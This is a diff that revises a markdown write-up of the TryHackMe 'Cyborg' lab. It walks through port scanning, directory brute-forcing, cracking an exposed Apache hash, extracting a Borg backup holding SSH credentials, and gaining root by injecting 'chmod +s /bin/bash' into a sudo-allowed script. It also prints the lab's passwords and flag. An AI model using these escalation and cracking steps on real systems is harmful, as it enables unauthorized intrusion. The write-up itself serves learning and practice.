@@ -1,141 +1,149 @@
-# 🛡️ TryHackMe – Cyborg
-Full Technical Walkthrough & Detailed Write-up
-
-  
-
----
+# 🛡️ TryHackMe – Cyborg - Writeup
 
 ## 📌 Overview
-Room Name: Cyborg
+**Room Name:** Cyborg  
+**Platform:** TryHackMe  
+**Difficulty:** Easy  
+**Category:** Web Exploitation / Archive Analysis / Privilege Escalation
 
-Platform: TryHackMe
+This challenge involves web enumeration, hash cracking, and analyzing a Borg Backup repository, ultimately leading to root access via a command injection vulnerability in a custom backup script.
 
-Difficulty: Easy
+The attack chain involves:
 
-Category: Web / Archive Analysis / Privilege Escalation
-
-This challenge involves a series of steps starting from web enumeration, hash cracking, and analyzing a Borg Backup repository, ultimately leading to root access via a command injection vulnerability in a custom script.
+- Web directory discovery revealing exposed hash and Borg Backup archive
+- hashcat to crack the archive password
+- Borg Backup extraction revealing SSH credentials
+- Command injection in a sudo-allowed backup script for root access
 
 ---
 
-## 🔍 1. Enumeration Phase
-### 🔎 Service Scanning
+## 🔍 1. Enumeration
 
-The initial reconnaissance was performed using `rustscan` to identify open ports on the target machine.
+### 🔎 Port Scanning
+Initial reconnaissance with `rustscan`:
 
-```
-
+```bash
 rustscan -a <TARGET_IP>
-
 ```
 
-Results:
-
-• 22/tcp: SSH
-
-• 80/tcp: HTTP (Apache2 default page)
+```text
+22/tcp open  ssh
+80/tcp open  http
+```
 
 ### 🌐 Web Directory Discovery
+The root page was a default Apache installation. Used `gobuster` to find hidden directories:
 
-As the root page was a default Apache installation, `gobuster` was used to uncover hidden directories.
-
-```
-
+```bash
 gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt -x php -t 50
-
 ```
 
-Key Findings:
+Key findings:
 
-• `/admin`: Contained a "Shoutbox" where a user named Alex mentioned insecure squid proxy settings.
-
-• `/etc`: Revealed a `passwd` file containing a hash and a `squid.conf` configuration file.
+- `/admin` — Shoutbox mentioning insecure squid proxy settings; also contained a downloadable `archive.tar`
+- `/etc` — Exposed a `passwd` file containing a password hash and a `squid.conf` configuration file
 
 ---
 
 ## 🔓 2. Initial Access
+
 ### 🔑 Hash Cracking
-
-The hash extracted from `/etc/passwd` was:
-
-`music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`
-
-Using `hashcat` with the Apache $apr1$ MD5 mode (1600), the password was recovered:
+The hash extracted from `/etc/passwd`:
 
 ```
+music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+```
 
+Cracked with `hashcat` (Apache MD5 mode `-m 1600`):
+
+```bash
 hashcat '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' /usr/share/wordlists/rockyou.txt -m 1600
-
 ```
 
-• Result: `squidward`
+**Password:** `squidward`
 
 ### 📦 Borg Backup Extraction
+Downloaded `archive.tar` from `/admin`. After extraction, it was identified as a **Borg Backup repository**. Extracted contents using the cracked password:
 
-A file named `archive.tar` was downloaded from the `/admin` page. After extraction, it was identified as a Borg Backup repository. Using the cracked password, I extracted the contents:
-
-```
-
+```bash
 borg extract ./home/field/dev/final_archive::music_archive
-
 ```
 
-Inside the extracted files, `note.txt` revealed Alex's SSH credentials:
+Inside, `note.txt` revealed Alex's SSH credentials:
 
-• User: `alex`
+```
+Username: alex
+Password: S3cretP@s3
+```
 
-• Password: `S3cretP@s3`
+Logged in via SSH:
+
+```bash
+ssh alex@<TARGET_IP>
+```
+
+**Initial access as `alex` achieved.** ✅
 
 ---
 
-## 🚀 3. Privilege Escalation
-### 🔍 Identifying the Vector
+## 👑 3. Privilege Escalation: alex → root
 
-After logging in via SSH, I audited the sudo permissions for the user `alex`:
+### 🔍 Sudo Misconfiguration — Command Injection
+Checked sudo permissions:
 
-```
-
+```bash
 sudo -l
-
 # (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
-
 ```
 
-Analysis of `backup.sh` revealed that the `-c` flag allowed for arbitrary command execution due to insufficient input validation.
+Analysis of `backup.sh` revealed the `-c` flag allowed arbitrary command execution due to insufficient input validation.
 
 ### 🔓 Gaining Root Shell
+Set the SUID bit on `/bin/bash`:
 
-I exploited the Command Injection vulnerability to set the SUID bit on `/bin/bash`, allowing for an easy escalation to root:
-
-```
-
+```bash
 sudo /etc/mp3backups/backup.sh -c 'chmod +s /bin/bash'
-
 /bin/bash -p
-
 ```
 
-Status: Root access obtained.
+**ROOT ACCESS GRANTED.** ✅
 
-root.txt:
+---
+
+## 🏁 Flags
+
+### 👑 Root Flag
+
+```bash
+cat /root/root.txt
+```
+
 ```
 flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
 ```
 
 ---
 
-## 🏁 4. Conclusion & Key Takeaways
-### 🔐 Security Lessons
+## 📚 Key Takeaways
 
-- Don't Leave Secret Doors Open: The biggest mistake was letting the public see the /etc folder on the website. Important files and password hashes should always be hidden away in a safe place, not left where anyone can find them.
+- 🌐 **Don't expose internal directories:** The `/etc` folder on the webserver exposed password hashes and configuration files. System paths should never be web-accessible.
+- 🔑 **Weak passwords undermine strong encryption:** Borg Backup is solid cryptography, but a dictionary-crackable password like `squidward` renders it useless.
+- 🛠️ **Scripts with sudo rights must sanitize input:** `backup.sh` trusted user-supplied flags without validation. Any script running with elevated privileges must strictly control what it executes.
+- 📝 **Credentials in plaintext files are a critical risk:** Storing passwords in `note.txt` inside a backup archive is one careless step away from full compromise.
 
-- Pick Stronger Passwords: Using a common word like squidward is like using a physical key that everyone has a copy of. Even good encryption (like Borg Backup) can't protect you if your password is easy to guess with a dictionary attack.
-
-- Be Careful with "Superuser" Scripts: The backup.sh script was dangerous because it trusted the user too much. If you give a script the power to run as root (the boss of the computer), it must be programmed to strictly follow rules and not just run whatever the user types in.
-
-- Notes are for Humans, not Passwords: Writing down passwords in a note.txt file is a very common but risky habit. It only takes one small slip-up for an attacker to find that note and walk right into the system.
 ---
 
+## 🛠️ Tools Used
+
+- `rustscan`
+- `gobuster`
+- `hashcat`
+- `borg`
+- `ssh`
+
+---
+
+## 📚 Credit
 ✍️ Author: Akira Hasuo
 
 📘 Created for educational and portfolio purposes only
